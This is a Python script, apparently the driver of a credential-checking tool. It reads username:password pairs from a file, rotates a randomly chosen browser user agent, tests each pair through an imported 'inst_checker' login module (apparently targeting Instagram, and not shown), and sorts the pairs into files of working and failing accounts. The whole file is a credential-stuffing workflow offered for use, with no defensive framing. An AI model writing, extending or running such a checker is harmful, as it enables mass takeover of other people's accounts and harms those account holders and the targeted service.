#!/usr/bin/env python3
# -*- mode: python; coding: utf-8 -*-

assert str is not bytes

import os, os.path
from urllib import parse as url_parse
from urllib import request as url_request
import json
import random
import threading
from lib_inst_checker_2015_03_29 import inst_checker

USERAGENT_LIST_URL = 'https://getuseragent.blogspot.com/2014/03/getuseragent.html'
REQUEST_TIMEOUT = 60.0
REQUEST_READ_LIMIT = 10000000

def get_useragent_list():
    marker_prefix = 'USERAGENT_DATA'
    start_marker = '\x3c!--{}_START'.format(marker_prefix)
    stop_marker = '{}_STOP--\x3e'.format(marker_prefix)
    
    opener = url_request.build_opener()
    opener_res = opener.open(
            url_request.Request(USERAGENT_LIST_URL),
            timeout=REQUEST_TIMEOUT,
            )
    raw_data = opener_res.read(REQUEST_READ_LIMIT).decode(errors='replace')
    start_pos = raw_data.find(start_marker)
    stop_pos = raw_data.find(stop_marker)
    
    if start_pos == -1 or stop_pos == -1:
        raise ValueError(
                'not found: start_marker or stop_marker',
                )
    
    useragent_raw_data = raw_data[start_pos+len(start_marker):stop_pos]
    useragent_data = json.loads(useragent_raw_data)
    
    if not isinstance(useragent_data, (tuple, list)):
        raise ValueError(
                'useragent_data is not isinstance of tuple-or-list',
                )
    
    useragent_list = []
    
    for useragent_item in useragent_data:
        if not isinstance(useragent_item, str) or \
                '\n' in useragent_item or '\r' in useragent_item:
            continue
        
        useragent_list.append(useragent_item)
    
    return tuple(useragent_list)

def safe_check(inst_checker_ctx):
    def thread_func():
        try:
            inst_checker.unsafe_check(inst_checker_ctx)
        except Exception as e:
            error_type = type(e)
            error_str = str(e)
            
            inst_checker_ctx.error_type = error_type
            inst_checker_ctx.error_str = error_str
        else:
            inst_checker_ctx.error_type = None
            inst_checker_ctx.error_str = None
    
    thr = threading.Thread(target=thread_func)
    thr.start()
    thr.join()
    
    return inst_checker

if __name__ == '__main__':
    in_path = os.path.join(os.path.dirname(__file__), '..', 'data', 'in.txt')
    out_good_path = os.path.join(os.path.dirname(__file__), '..', 'data', 'out_good.txt')
    out_bad_path = os.path.join(os.path.dirname(__file__), '..', 'data', 'out_bad.txt')
    
    ua_name = random.choice(get_useragent_list())
    
    in_fd = open(in_path, mode='r', encoding='utf-8', errors='replace')
    out_good_fd = open(out_good_path, mode='w', encoding='utf-8', newline='\n')
    out_bad_fd = open(out_bad_path, mode='w', encoding='utf-8', newline='\n')
    
    for in_line in in_fd:
        line = in_line.strip()
        in_line_split = line.split(sep=':')
        
        if len(in_line_split) != 2:
            continue
        
        username = in_line_split[0].strip()
        password = in_line_split[1].strip()
        
        print('begin:', username)
        
        inst_checker_ctx = inst_checker.InstCheckerCtx()
        inst_checker.init_inst_checker_ctx(inst_checker_ctx, ua_name, username, password)
        safe_check(inst_checker_ctx)
        
        if inst_checker_ctx.error_type is not None:
            print('error:', inst_checker_ctx.error_type, inst_checker_ctx.error_str)
            continue
        
        if inst_checker_ctx.is_auth:
            out_good_fd.write('{}\n'.format(line))
            out_good_fd.flush()
        else:
            out_bad_fd.write('{}\n'.format(line))
            out_bad_fd.flush()
        
        print('result:', inst_checker_ctx.is_auth)
    
    print('all done!')
